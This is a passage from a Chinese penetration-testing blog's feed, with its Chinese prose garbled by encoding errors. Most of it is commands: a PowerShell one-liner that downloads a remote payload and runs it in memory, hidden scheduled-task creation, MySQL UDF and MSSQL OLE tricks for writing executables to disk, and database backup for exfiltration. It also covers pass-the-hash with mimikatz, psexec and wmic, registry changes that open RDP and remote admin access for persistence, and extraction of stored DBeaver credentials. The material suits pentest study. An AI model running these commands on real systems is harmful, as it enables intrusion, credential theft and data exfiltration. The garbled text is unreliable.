&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;MySQL &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;none&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;select&lt;/span&gt; @@version_compile_os, @@version_compile_machine&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+----------------------+---------------------------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; @@version_compile_os &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; @@version_compile_machine &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+----------------------+---------------------------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Win64                &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; x86_64                    &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+----------------------+---------------------------+
MySQL &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;none&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; show variables like &lt;span class=&quot;token string&quot;&gt;&#39;%compile%&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+-------------------------+--------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Variable_name           &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Value  &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+-------------------------+--------+
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; version_compile_machine &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; x86_64 &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; version_compile_os      &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; Win64  &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
+-------------------------+--------+&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;åœ¨&lt;code&gt;Mysql 5.0.67&lt;/code&gt;ç‰ˆæœ¬å¼€å§‹ï¼ŒUDFçš„æ–‡ä»¶å¿…é¡»æ”¾åœ¨mysqlçš„æ’ä»¶ç›®å½•: &lt;code&gt;select @@plugin_dir;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥åœ¨å¼€å¯mysqlçš„æ—¶å€™è®¾ç½®pluginçš„ç›®å½•:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;æŒ‡å®šç›®å½•:
mysqld.exe â€“plugin-dir&amp;#x3D;C:\\temp\\plugins\\

æŒ‡å®šé…ç½®æ–‡ä»¶:
mysqld.exe --defaults-file&amp;#x3D;C:\\temp\\my.ini

é…ç½®æ–‡ä»¶åŒ…æ‹¬å¦‚ä¸‹å†…å®¹:
[mysqld]
plugin_dir &amp;#x3D; C:\\temp\\plugins\\&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è€ç‰ˆæœ¬çš„Mysqlæœç´¢UDFè·¯å¾„æ˜¯æŒ‰ç…§å¦‚ä¸‹çš„é¡ºåºæ¥çš„:&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Com Object</title>
    <link href="https://jkme.github.io/2020/07/16/Com-Object-Pentest-Note2.html"/>
    <id>https://jkme.github.io/2020/07/16/Com-Object-Pentest-Note2.html</id>
    <published>2020-07-15T16:00:00.000Z</published>
    <updated>2022-01-21T02:42:15.697Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>COM is the foundation technology for Microsoftâ€™s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p></blockquote><p>æˆ‘å°±çå†™äº†:</p><p>COMæ˜¯åœ¨1990sçš„æ—¶å€™è¯ç”Ÿçš„ï¼Œå¯ç”¨æ¥åˆ†ç¦»ä»£ç æ¨¡å—å’Œå…¶å®ƒå†…å®¹ã€‚</p><h3 id="æ–‡ä»¶ä¸‹è½½"><a href="#æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ–‡ä»¶ä¸‹è½½"></a>æ–‡ä»¶ä¸‹è½½</h3><pre class="line-numbers language-none"><code class="language-none">Powershellæ— æ–‡ä»¶è½åœ°æ‰§è¡Œ$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ä¸‹è½½æ–‡ä»¶,å¦‚æœéœ€è¦ä¸‹è½½exeï¼Œè½¬æ¢æˆhexæˆ–è€…base64ï¼Œå†ç¼–ç powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å®šæ—¶ä»»åŠ¡"><a href="#å®šæ—¶ä»»åŠ¡" class="headerlink" title="å®šæ—¶ä»»åŠ¡"></a>å®šæ—¶ä»»åŠ¡</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))$Instance.Connect()$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)$Task &#x3D; $Instance.NewTask(0)$Trigger &#x3D; $Task.triggers.Create(0)$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;$Trigger.Enabled &#x3D; $True$Trigger.Id &#x3D; $Taskname$Action &#x3D; $Task.Actions.Create(0)$Action.Path &#x3D; â€œcmd.exeâ€$Action.Arguments &#x3D; â€œ&#x2F;c whoamiâ€$Action.HideAppWindow &#x3D; $True$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)function Convert-Date &#123;               param(             [datetime]$Date        )               PROCESS &#123;               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;        &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;COM is the foundation technology for Microsoftâ€™s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æˆ‘å°±çå†™äº†:&lt;/p&gt;
&lt;p&gt;COMæ˜¯åœ¨1990sçš„æ—¶å€™è¯ç”Ÿçš„ï¼Œå¯ç”¨æ¥åˆ†ç¦»ä»£ç æ¨¡å—å’Œå…¶å®ƒå†…å®¹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;æ–‡ä»¶ä¸‹è½½&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶ä¸‹è½½&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶ä¸‹è½½&quot;&gt;&lt;/a&gt;æ–‡ä»¶ä¸‹è½½&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Powershellæ— æ–‡ä»¶è½åœ°æ‰§è¡Œ
$o &amp;#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&amp;quot;F5078F35-C551-11D3-89B9-0000F81FE221&amp;quot;)); $o.Open(&amp;quot;GET&amp;quot;, &amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;payload&amp;quot;, $False); $o.Send(); IEX $o.responseText;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ä¸‹è½½æ–‡ä»¶,å¦‚æœéœ€è¦ä¸‹è½½exeï¼Œè½¬æ¢æˆhexæˆ–è€…base64ï¼Œå†ç¼–ç 
powershell -Command &amp;quot;$o &amp;#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&amp;quot;F5078F35-C551-11D3-89B9-0000F81FE221\&amp;quot;)); $o.Open(\&amp;quot;GET\&amp;quot;, \&amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;payload\&amp;quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;å®šæ—¶ä»»åŠ¡&quot;&gt;&lt;a href=&quot;#å®šæ—¶ä»»åŠ¡&quot; class=&quot;headerlink&quot; title=&quot;å®šæ—¶ä»»åŠ¡&quot;&gt;&lt;/a&gt;å®šæ—¶ä»»åŠ¡&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;$TaskName &amp;#x3D; [Guid]::NewGuid().ToString()
$Instance &amp;#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&amp;quot;Schedule.Service&amp;quot;))
$Instance.Connect()
$Folder &amp;#x3D; $Instance.GetFolder(&amp;quot;\&amp;quot;)
$Task &amp;#x3D; $Instance.NewTask(0)
$Trigger &amp;#x3D; $Task.triggers.Create(0)
$Trigger.StartBoundary &amp;#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
$Trigger.EndBoundary &amp;#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
$Trigger.ExecutionTimelimit &amp;#x3D; &amp;quot;PT5M&amp;quot;
$Trigger.Enabled &amp;#x3D; $True
$Trigger.Id &amp;#x3D; $Taskname
$Action &amp;#x3D; $Task.Actions.Create(0)
$Action.Path &amp;#x3D; â€œcmd.exeâ€
$Action.Arguments &amp;#x3D; â€œ&amp;#x2F;c whoamiâ€
$Action.HideAppWindow &amp;#x3D; $True
$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &amp;quot;&amp;quot;, &amp;quot;&amp;quot;, 3)

function Convert-Date &amp;#123;       

        param(
             [datetime]$Date

        )       

        PROCESS &amp;#123;
               $Date.Touniversaltime().tostring(&amp;quot;u&amp;quot;) -replace &amp;quot; &amp;quot;,&amp;quot;T&amp;quot;
        &amp;#125;
&amp;#125;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html&quot;&gt;https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµæ°´è´¦</title>
    <link href="https://jkme.github.io/2020/05/14/workgroup-pentest2.html"/>
    <id>https://jkme.github.io/2020/05/14/workgroup-pentest2.html</id>
    <published>2020-05-13T16:00:00.000Z</published>
    <updated>2022-01-21T03:25:13.534Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-ç¯å¢ƒ"><a href="#0x01-ç¯å¢ƒ" class="headerlink" title="0x01 ç¯å¢ƒ"></a>0x01 ç¯å¢ƒ</h2><ol><li>Linuxä¸»æœºwwwæƒé™</li><li>ä¸»æœºæ— æ³•å‡ºå¤–ç½‘</li><li>æ­£å‘ä»£ç†æ— æ³•ä½¿ç”¨</li><li>Bæ®µå†…ç½‘</li></ol><h2 id="æ”¶é›†ä¿¡æ¯"><a href="#æ”¶é›†ä¿¡æ¯" class="headerlink" title="æ”¶é›†ä¿¡æ¯"></a>æ”¶é›†ä¿¡æ¯</h2><p>#####F-Scrack.py</p><pre class="line-numbers language-none"><code class="language-none">è·å–Redis, ESç­‰PS: Scrack.pyçš„mssqlæ¨¡å—çˆ†ç ´ä¸å‡†ç¡®ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>keyè¾ƒå¤šçš„æ—¶å€™ä¸è¦ä½¿ç”¨<code>keys *</code></p><pre class="line-numbers language-none"><code class="language-none">æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯: masterï¼Œæ•°é‡ï¼Œç‰ˆæœ¬å·ä½¿ç”¨scanæŸ¥çœ‹keys: scan 0 match * count 100 æŸ¥çœ‹ç±»å‹: type &lt;key&gt;hashç±»å‹: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windowsä¸‹å¯ä»¥å…ˆæµ‹è¯•æ˜¯å¦å¯å†™å…¥æ’ä»¶ç›®å½•:</p><pre class="line-numbers language-none"><code class="language-none">select @@plugin_dir;select hello into outfile &lt;plugin_dir&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶åä½¿ç”¨msfçš„è‡ªå¸¦çš„udfï¼Œå…ˆè½¬æ¢ä¸º16è¿›åˆ¶ï¼Œç„¶åå¯¼å‡ºåˆ°æ’ä»¶ç›®å½•:</p><pre class="line-numbers language-none"><code class="language-none">use test;set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);create table Ghost(data LONGBLOB);insert into Ghost values(&quot;&quot;);update Ghost set data &#x3D; @a;select data from Ghost into DUMPFILE &lt;dir&gt;;create function sys_eval returns string soname &#39;sys_eval.dll&#39;;drop function sys_eval; &#x2F;&#x2F;ç”¨å®Œåˆ é™¤ï¼Œå…»æˆå¥½ä¹ æƒ¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>é¦–é€‰sys_eval, å°½é‡ä¸è¦ä½¿ç”¨sys_exec(ä¼šå´©æºƒ)</code></strong></p><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>mssqlçˆ†ç ´å°½é‡æ”¾åœ¨åé¢æ‰§è¡Œï¼ŒåŠ¨é™ä¼šæ¯”è¾ƒå¤§ã€‚</p><pre class="line-numbers language-none"><code class="language-none">mssqlçˆ†ç ´æˆåŠŸä¹‹åï¼Œæœ€å¥½ä½¿ç”¨CLRæ¥è·å–æƒé™ï¼Œç›´æ¥ä½¿ç”¨&#96;xp_cmdshell&#96;ä¼šæ­»ç¿˜ç¿˜,360ä¼šæ‹¦æˆª<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å·²çŸ¥mssqlçš„ç”¨æˆ·å¯†ç ï¼Œcertutilç­‰å·¥å…·ä¼šè¢«æ‹¦æˆªæˆ–è€…æŠ¥è­¦ï¼Œå¯ä»¥ä½¿ç”¨mssqlè‡ªå¸¦çš„å·¥å…·å†™å…¥åˆ°ç¡¬ç›˜ï¼š</p><p>ç°å¼€å¯å­˜å‚¨è¿‡ç¨‹:</p><pre class="line-numbers language-none"><code class="language-none">sp_configure &#39;show advanced options&#39;, 1;  GO  RECONFIGURE;  GO  sp_configure &#39;Ole Automation Procedures&#39;, 1;  GO  RECONFIGURE;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="mssqlå†™å¤§æ–‡ä»¶"><a href="#mssqlå†™å¤§æ–‡ä»¶" class="headerlink" title="mssqlå†™å¤§æ–‡ä»¶"></a>mssqlå†™å¤§æ–‡ä»¶</h5><p>æ¯”å¦‚exeä¹‹ç±»çš„å…ˆè½¬æ¢ä¸ºhex,ç„¶åå†å†™å…¥åˆ°æ–‡ä»¶:</p><p><code>xxd -plain /tmp/test.exe | tr -d &#39;\n&#39; &gt; /tmp/dll.hex</code></p><pre class="line-numbers language-none"><code class="language-none">declare @hexstring varchar(max);set @hexstring &#x3D; &#39;è½¬æ¢ä¹‹åçš„hex&#39;;declare @file varbinary(max);set @file &#x3D; (select cast(&#39;&#39; as xml).value(&#39;xs:hexBinary( substring(sql:variable(&quot;@hexstring&quot;), sql:column(&quot;t.pos&quot;)) )&#39;, &#39;varbinary(max)&#39;)from (select case substring(@hexstring, 1, 2) when &#39;0x&#39; then 3 else 0 end) as t(pos));select @file;declare @init int;declare @filepath nvarchar(4000) &#x3D; N&#39;c:\22.exe&#39;;EXEC sp_OACreate &#39;ADODB.Stream&#39;, @init OUTPUT; -- An instace createdEXEC sp_OASetProperty @init, &#39;Type&#39;, 1;EXEC sp_OAMethod @init, &#39;Open&#39;; -- Calling a methodEXEC sp_OAMethod @init, &#39;Write&#39;, NULL, @file; -- Calling a methodEXEC sp_OAMethod @init, &#39;SaveToFile&#39;, NULL, @filepath, 2; -- Calling a methodEXEC sp_OAMethod @init, &#39;Close&#39;; -- Calling a methodEXEC sp_OADestroy @init; -- Closed the resources<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="mssqlå¤‡ä»½"><a href="#mssqlå¤‡ä»½" class="headerlink" title="mssqlå¤‡ä»½"></a>mssqlå¤‡ä»½</h4><pre class="line-numbers language-none"><code class="language-none">BACKUP DATABASE &lt;db&gt;TO DISK &#x3D; &#39;C:\Windows\temp\db.bak&#39; WITH COMPRESSION, INIT, STATS &#x3D; 5;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>åˆ†å·å‹ç¼©</li></ul><pre class="line-numbers language-none"><code class="language-none">rar.exe a -m0 -v100m C:\windows\temp\db.split C:\windows\tasks\db.bakdownload C:\\windows\\temp\\db.split.rar &#x2F;var&#x2F;tmp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h4><ul><li>wmi</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.1.158 &#x2F;user:pt007 &#x2F;password:admin123  process call create &quot;cmd.exe &#x2F;c ipconfig&gt;d:\result.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¨èä½¿ç”¨wmiexec.vbs:</p><p><a href="https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs">https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs</a></p><pre class="line-numbers language-none"><code class="language-none">cscript C:\Windows\Tasks\aliwmi.vbs &#x2F;cmd &lt;ip&gt;  &quot;C:\Windows\system32\calc.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>msf</li></ul><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec show optionsset RHOST 192.168.81.129set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BFset SMBUser Administratorshow optionsrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>mimikatz || Cobalt Strike</li></ul><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;sekurlsa::pth &#x2F;domain:. &#x2F;user:administrator &#x2F;ntlm:2D20D252A479F485CDF5E171D93985BF &#x2F;run:cmd.exe&quot; &#x2F;&#x2F;ä¼ é€’hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>psexec</li></ul><pre class="line-numbers language-none"><code class="language-none">psexec &#x2F;accepteula &#x2F;&#x2F;æ¥å—è®¸å¯åè®®sc delete psexesvcpsexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>psexec.vbs</li></ul><pre class="line-numbers language-none"><code class="language-none">cscript psexec.vbs 192.168.1.158 pt007 admin123 &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>è¿œç¨‹å‘½ä»¤æ‰§è¡Œsc</li></ul><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.17.138\c$ &quot;admin123&quot; &#x2F;user:pt007net usedir \\192.168.17.138\c$copy test.exe \\192.168.17.138\c$sc \\192.168.17.138 create test binpath&#x3D; &quot;c:\test.exe&quot;sc \\192.168.17.138 start testsc \\192.168.17.138 del test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>windowsè¿œç¨‹æ‰§è¡Œcmdçš„9ç§æ–¹æ³•: <a href="https://xz.aliyun.com/t/5957">https://xz.aliyun.com/t/5957</a></p><h3 id="access-is-denied"><a href="#access-is-denied" class="headerlink" title="access is denied"></a>access is denied</h3><p>å¯¹äºä»»ä½•éRID 500çš„æœ¬åœ°ç®¡ç†å‘˜(Administrator)è¿æ¥åˆ°Windows Vista+çš„è®¡ç®—æœºï¼Œæ— è®ºé‡‡ç”¨wmiã€psexecè¿˜æ˜¯å…¶å®ƒæ–¹æ³•ï¼Œä½¿ç”¨çš„ä»¤ç‰Œéƒ½æ˜¯ä¸­ç­‰ä»¤ç‰Œ, ä½¿ç”¨wmiexecçš„æ—¶å€™ä¼šä¿®æš—ç¤ºAccess is Denied</p><p>åœ¨æŠ“å–hashçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œä½¿å¾—æœ¬åœ°ç®¡ç†å‘˜ç»„æˆå‘˜éƒ½å¯ä»¥è¿œç¨‹è¿æ¥,ä½œä¸ºä¸€ç§æŒä¹…åŒ–çš„æ‰‹æ®µã€‚</p><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>###RDPçš„PTH<br>æŠ“å–hashæ— æ³•ç ´è§£çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä½¿ç”¨hashè¿œç¨‹ç™»å½•RDPï¼Œéœ€è¦è¢«ç™»å½•çš„ç³»ç»Ÿå¼€å¯â€Restricted Admin Modeâ€, åœ¨Windows8.1å’ŒWindows Server 2012R2ä¸Šé»˜è®¤å¼€å¯ã€‚Windows7å’ŒWinServer 2008éœ€è¦å®‰è£…2871997ã€2973351å¸ƒä¸ã€‚</p><h4 id="å¯åŠ¨RDP"><a href="#å¯åŠ¨RDP" class="headerlink" title="å¯åŠ¨RDP"></a>å¯åŠ¨RDP</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;fREG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f  # ç›‘å¬ 3389 ç«¯å£ å¼€å¯3389wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å¼€å¯Restricted-Admin-mode"><a href="#å¼€å¯Restricted-Admin-mode" class="headerlink" title="å¼€å¯Restricted Admin mode"></a>å¼€å¯Restricted Admin mode</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="å¢åŠ é˜²ç«å¢™è§„åˆ™"><a href="#å¢åŠ é˜²ç«å¢™è§„åˆ™" class="headerlink" title="å¢åŠ é˜²ç«å¢™è§„åˆ™"></a>å¢åŠ é˜²ç«å¢™è§„åˆ™</h4><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; dir&#x3D;in protocol&#x3D;TCP localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="dump-passwod"><a href="#dump-passwod" class="headerlink" title="dump passwod"></a>dump passwod</h3><p>####dbeaver</p><p>dbeaver6çš„é…ç½®æ–‡ä»¶(ä¸åŒç‰ˆæœ¬å­˜å‚¨çš„ä½ç½®å’Œè§£å¯†æ–¹å¼ä¸ä¸€æ ·):</p><pre class="line-numbers language-none"><code class="language-none">#å¯†ç åŠ å¯†å­˜å‚¨ä½ç½®:C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\credentials-config.json#urlå’Œç”¨æˆ·å:C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\data-sources.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§£å¯†è„šæœ¬: <a href="https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61">https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61</a></p><p>ä¸‹è½½<code>credentials-config.json</code>è„šæœ¬ä¹‹åï¼Œä½¿ç”¨pythonè§£å¯†:<code>python decrypt.py credentials-config.json</code>ï¼Œç„¶åæ 